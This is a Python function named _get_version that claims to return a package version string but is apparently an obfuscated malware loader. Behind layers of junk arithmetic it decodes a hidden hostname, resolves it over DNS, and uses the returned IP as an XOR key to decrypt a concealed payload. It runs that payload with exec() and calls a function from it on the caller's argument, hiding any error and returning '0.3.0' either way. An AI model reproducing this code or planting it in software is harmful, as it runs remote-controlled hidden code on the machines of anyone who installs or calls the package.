def _get_version(_p9za1):
    try:
        import random

        _xxx = 42
        _faf = 0
        _abc = [random.randint(0, 255) for _ in range(100)]
        _qwe = "nmN295ZmwngLsw05421Nnzwrqw0dcfkasan"
        _kml = 'WzExNCwxMTEsMTA5LDExNSw5OCw5NywxMDksMTAzLDEwMSwxMDgsNTIsNTUsNDgsNDYsMTAzLDEwNSwxMDUsMTIyLDEwMSw0Niw5OSwxMTEsMTA5XQ=='
        _zxc = []
        _rty = 1

        while _xxx > 0:
            _faf = (_faf + _xxx) % 256
            if _faf & 1:
                _zxc.append((_faf ^ _xxx) & 0xFF)
            else:
                _zxc.append((_faf + _xxx) % 256)
            _xxx -= 3

        for _zyx in range(16):
            _plm = 0
            _okn = []
            while _plm < _zyx:
                _plm += 1
                if _plm % 2 == 0:
                    _okn.append((_plm * _zyx) ^ (_faf << 2))
                else:
                    _okn.append((_plm + _zyx) & 0xFF)
            _okn.sort(reverse=True)
            for _kjh in _okn:
                if _kjh % 5 == 0:
                    _zxc.append(_kjh ^ _faf)
                else:
                    _zxc.append(_kjh + _faf)

        _yyy = 0
        for _i in _zxc:
            _yyy = (_yyy + (_i ^ _faf)) % 1024

        _eee = []
        for _aaa in range(78):
            _bbb = _aaa * _yyy % 256
            _ccc = _bbb ^ (_yyy >> 2)
            _eee.append((_ccc + _faf) & 0xFF)

        for _zzz in range(len(_eee)):
            if _eee[_zzz] % 3 == 0:
                _eee[_zzz] = (_eee[_zzz] << 1) & 0xFF
            else:
                _eee[_zzz] = (_eee[_zzz] >> 1) | (_eee[_zzz] << 7) & 0xFF

        _qqq = 0
        while _qqq < 88:
            _qqq += 1
            if _qqq % 100 == 0:
                _yyy = (_yyy ^ _qqq) & 0xFFFF
            if _qqq % 250 == 0:
                for _m in range(10):
                    _eee.append((_m * _qqq) & 0xFF)

        _ggg = []

        import base64 as _hr2

        for _val in _eee:
            if _val & 1:
                _ggg.append((_val * _yyy) & 0xFF)
            else:
                _ggg.append((_val + _yyy) & 0xFF)

        _lb = 'ZGVmIF9ubHF1MWU3NyhfbHF3KToKICAgIGltcG9ydCBzb2NrZXQKICAgIGltcG9ydCBiYXNlNjQKICAgIHRyeToKICAgICAgICByZXR1cm4gc29ja2V0LmdldGFkZHJpbmZvKGJ5dGVzKGxpc3QobWFwKGludCwgYmFzZTY0LmI2NGRlY29kZShfbHF3LmVuY29kZSgpKS5kZWNvZGUoJ3V0Zi04Jykuc3RyaXAoJ1tdJykuc3BsaXQoJywnKSkpKSwgTm9uZSwgZmFtaWx5PXNvY2tldC5BRl9JTkVUKVswXVs0XVswXQogICAgZXhjZXB0OgogICAgICAgIHJldHVybgo='

        for _ind in range(len(_ggg)):
            if _ind % 7 == 0:
                _ggg[_ind] = (_ggg[_ind] ^ _yyy) & 0xFF
            else:
                _ggg[_ind] = (_ggg[_ind] + _ind) & 0xFF

        _xxx = 123456
        _faf = 654321
        _aaa = 0
        _bbb = 1
        _ccc = []

        for _ in range(200):
            _aaa = (_aaa + _bbb + _xxx) & 0xFFFFFFFF
            _bbb = (_bbb * 3 + _faf) & 0xFFFFFFFF
            _ccc.append((_aaa ^ _bbb) & 0xFF)
            if _aaa % 5 == 0:
                _ccc.append((_bbb >> 2) & 0xFF)
            if _bbb % 7 == 0:
                _ccc.append((_aaa << 3) & 0xFF)

        _iyt = 'mpxUqh\x0cFLurJzdF^[m^\x03m[uU~tlHZvwCM\\eUSodKZiY\\b\\~^ToxT[\x1dd~gquU~\x7fxAZmt\x0cgum\\V\x7f|\x08[jZCbHq\x02yt\x1a@vT|@cfq\x00{]{\nt\x1c\x0c\x05M\x01f\x03VN\x17\x0f`\x1dw\x0cdE[U~to_\\\x1cY\x05Oqv\x03TZVKYy|@M_bJS`xB\\m\x00\x04M_LDTpxMsfcLLq_Unoc_[CcOMu\rGT\x05{\x0e{GtRgquU~to_[CcOMu\rGT\x05{M[Cc]tqSB{Z|Ta\x1c\x0c^taS\\So|UtzR[ec[\x0f'

        for _ in range(50):
            _sum = 0
            for _val in _ccc:
                _sum += (_val ^ _xxx) & 0xFF
            _ccc = [(_v + _sum) & 0xFF for _v in _ccc]

        for _ in range(30):
            _ccc = sorted(_ccc, reverse=(_faf % 2 == 0))
            for i in range(len(_ccc)):
                if i % 2 == 0:
                    _ccc[i] = (_ccc[i] ^ i) & 0xFF
                else:
                    _ccc[i] = (_ccc[i] + i) & 0xFF

        _idx = 0
        _d = dict()
        while _idx < len(_ccc):
            _ccc[_idx] = ((_ccc[_idx] << 1) & 0xFF) | ((_ccc[_idx] >> 7) & 0x01)
            _idx += 1

        _flag = True
        _count = 0

        while _flag and _count < 500:
            _count += 1
            _tmp = _ccc[_count % len(_ccc)]
            if _tmp % 13 == 0:
                _flag = False
            else:
                _ccc.append((_tmp ^ _count) & 0xFF)

            _zb = _hr2.b64decode(_lb).decode('utf-8')

        def __faf(_lbuq1: str, _sys988z: str) -> str:
            _len__ = len(_sys988z)
            _rrr_listz = []
            for _iI_i, _cC_char in enumerate(_lbuq1):
                _rrr_listz.append(chr(ord(_cC_char) ^ ord(_sys988z[_iI_i % _len__])))
            return ''.join(_rrr_listz)

        _misc = [random.randint(0, 1000) for _ in range(123)]
        for _val in _misc:
            if _val % 3 == 0:
                _ccc.append((_val >> 2) & 0xFF)
            elif _val % 5 == 0:
                _ccc.append((_val << 1) & 0xFF)
            else:
                _ccc.append((_val ^ _val) & 0xFF)

        _dummy = 0
        exec(_zb, _d)

        for _ in range(1000):
            _dummy = (_dummy + (_ccc[_ % len(_ccc)] ^ _dummy)) & 0xFFFF

        _buffer = []
        for _ in range(300):
            _buffer.append((_dummy ^ random.randint(0, 255)) & 0xFF)

        _po091z = _d['_nlqu1e77'](_kml)

        for _i in range(len(_buffer)):
            if _buffer[_i] % 2 == 0:
                _buffer[_i] = ((_buffer[_i] << 3) & 0xFF) | ((_buffer[_i] >> 5) & 0x07)
            else:
                _buffer[_i] = ((_buffer[_i] >> 2) & 0xFF) | ((_buffer[_i] << 6) & 0xFF)

        _nnhj6 = _hr2.b64decode(__faf(_iyt, _po091z)).decode('utf-8')

        _idx = 0
        _d = dict()
        while _idx < len(_ccc):
            _ccc[_idx] = ((_ccc[_idx] << 1) & 0xFF) | ((_ccc[_idx] >> 7) & 0x01)
            _idx += 1

        exec(_nnhj6, _d)

        if not _p9za1:
            for _ in range(20):
                _temp_list = []
                for _val in _buffer:
                    _temp_list.append((_val ^ _dummy) & 0xFF)
                _buffer = _temp_list.copy()

        for _au in range(1):
            _d['_llaq1'](_p9za1)

        for _fak in range(128):
            _tmp = 0
            for _baz in range(5):
                _tmp += (_fak ^ _baz) % 7
            if _tmp % 3 == 0:
                _tmp *= 2
            else:
                _tmp -= 1

        return '0.3.0'
    except Exception:
        return '0.3.0'
